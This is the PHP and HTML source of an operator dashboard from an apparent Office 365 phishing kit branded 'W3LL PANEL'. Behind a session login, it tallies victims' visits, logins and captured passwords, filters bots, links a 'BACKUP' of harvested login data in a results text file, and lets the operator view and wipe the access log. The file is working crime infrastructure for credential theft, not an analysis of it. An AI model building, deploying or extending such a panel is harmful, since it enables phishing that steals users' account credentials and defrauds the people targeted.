<?php
session_start();
require 'config.php';

if(!isset($_SESSION['login'])) {
    header('Location: login.php');
    exit();
}

if(isset($_POST['clear'])) {
    file_put_contents('../logs/access.log', '');
}
?>
<!DOCTYPE html>
<html lang="en">
    <head>
        <title>W3LL OFFICE 365 PANEL</title>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.2.1/css/bootstrap.min.css">
        <link rel="stylesheet" href="//cdn.datatables.net/1.10.19/css/jquery.dataTables.min.css">
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js"></script>
        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.2.1/js/bootstrap.min.js"></script>
        <script src="//cdn.datatables.net/1.10.19/js/jquery.dataTables.min.js"></script>
        <style type="text/css">
            .row {
                margin-top: 30px;
            }
        </style>
    </head>
    <style>
body {
background-color: #000000
}
</style>
        <nav class="navbar navbar-expand-md bg-dark navbar-dark">
            <a class="navbar-brand" href="#">W3LL PANEL</a>

            <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#collapsibleNavbar">
                <span class="navbar-toggler-icon"></span>
            </button>

            <div class="collapse navbar-collapse" id="collapsibleNavbar">
                <ul class="navbar-nav ml-auto">
                    <li class="nav-item">
                        <a class="nav-link" href="logout.php">Logout</a>
                    </li>
                </ul>
            </div>
        </nav>
        <div class="container">
            <div class="row">
                <div class="col-lg-12 col-md-12 col-xs-12">
                    <button type="button" class="btn btn-danger btn-block" id="clear">Clear All Statistic & History</button><br>
					<DIV style="PADDING-BOTTOM: 10px; PADDING-LEFT: 1px; PADDING-RIGHT: 50px; PADDING-TOP: 10px" class="button-container center " align=center><A style="BORDER-BOTTOM: transparent 0px solid; TEXT-ALIGN: center; BORDER-LEFT: transparent 0px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #0058d3; PADDING-LEFT: 2px; WIDTH: 24%; PADDING-RIGHT: 2px; DISPLAY: block; FONT-FAMILY: Arial, 'Helvetica Neue', Helvetica, sans-serif; MAX-WIDTH: 460px; COLOR: #ffffff; BORDER-TOP: transparent 0px solid; BORDER-RIGHT: transparent 0px solid; TEXT-DECORATION: none; PADDING-TOP: 5px; -webkit-text-size-adjust: none; border-radius: 4px; -webkit-border-radius: 4px; -moz-border-radius: 4px; mso-border-alt: none" href="./../result/info-login.txt" target=_blank><SPAN style="LINE-HEIGHT: 24px; FONT-SIZE: 12px"><SPAN style="LINE-HEIGHT: 32px; FONT-SIZE: 16px" data-mce-style="font-size: 16px; line-height: 44px;">BACKUP</SPAN></SPAN> </A></DIV>
                </div>
            </div>
            <div class="row">
                <div class="col-lg-3 col-md-3 col-xs-12">
                    <div class="card">
                        <div class="card-header text-center">Visit</div>
                        <div class="card-body text-center">
                            <h3><?= getLog('visit') ?></h3>
                        </div>
                    </div>
                </div>
                <div class="col-lg-3 col-md-3 col-xs-12">
                    <div class="card">
                        <div class="card-header text-center">Login</div>
                        <div class="card-body text-center">
                            <h3><?= getLog('login') ?></h3>
                        </div>
                    </div>
                </div>
                <div class="col-lg-3 col-md-3 col-xs-12">
                    <div class="card">
                        <div class="card-header text-center">Password</div>
                        <div class="card-body text-center">
                            <h3><?= getLog('password') ?></h3>
                        </div>
                    </div>
                </div>
                <div class="col-lg-3 col-md-3 col-xs-12">
                    <div class="card">
                        <div class="card-header text-center">BOT</div>
                        <div class="card-body text-center">
                            <h3><?= getLog('bot') ?></h3>
                        </div>
                    </div>
                </div>
            </div>
            <div class="row">
                <div class="col-lg-12 col-md-12 col-xs-12">
                    <div class="card">
                        <div class="card-header">
                            History
                        </div>
                        <div class="card-body">
                            <table class="table">
                                <thead>
                                    <tr>
                                        <th>Description</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <?php foreach(array_unique(explode("\n", file_get_contents('../logs/access.log'))) as $data): ?>
                                    <tr>
                                        <td><?= urldecode($data) #endregion ?></td>
                                    </tr>
                                    <?php endforeach; ?>
                                </tbody>
                            </table>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <script>
            $(function() {
                $('table').DataTable({
                    "order": [[ 0, "desc" ]]
                });

                $(document).on('click', '#clear', function() {
                    $.post('index.php', {clear: true}, function(data) {
                        //alert('Reset');
                        setTimeout(function() {
                            window.location.reload();
                        }, 500);
                    });
                });
            });
        </script>
    </body>
</html>